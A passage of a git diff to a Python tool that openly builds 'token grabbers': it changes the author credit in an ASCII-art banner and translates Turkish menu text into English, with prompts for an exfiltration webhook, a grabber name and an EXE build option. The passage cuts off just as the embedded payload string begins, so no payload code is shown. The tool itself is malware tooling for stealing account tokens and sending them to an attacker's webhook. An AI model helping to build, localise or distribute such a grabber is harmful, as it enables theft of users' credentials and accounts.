@@ -26,9 +26,7 @@ def logo():
                                   "  "$$$$$P"
                                       $$P*"
                                      .$"
-                                     "                 by Nikon of Disast
-                                                                &
-                                                             KaptanTR''', "green")
+                                     "                 by iKayDev''', "green")
 
 
 def menu():
@@ -45,18 +43,18 @@ def menu():
 def menu2():
     print(" ")
     print("""
-    [1] : Token Grabber Menü.
-    [2] : Webhook Kaydet.
-    [3] : Terminal'i Temizle.
-    [4] : Çıkış.
+    [1] : Token Grabber Menu.
+    [2] : Save a Webhook.
+    [3] : Clear the Terminal.
+    [4] : Exit.
     """)
     giris()
 
 
 def grabbermenu():
     webhook = input("Webhook: ")
-    adi = input("Grabber adı: ")
-    exe = input("'EXE' çıktısı istiyor musunuz? E/H: ")
+    adi = input("Grabber Name: ")
+    exe = input("Do you want a 'EXE' output? E/H: ")
     payload = """
 import os
 import sys
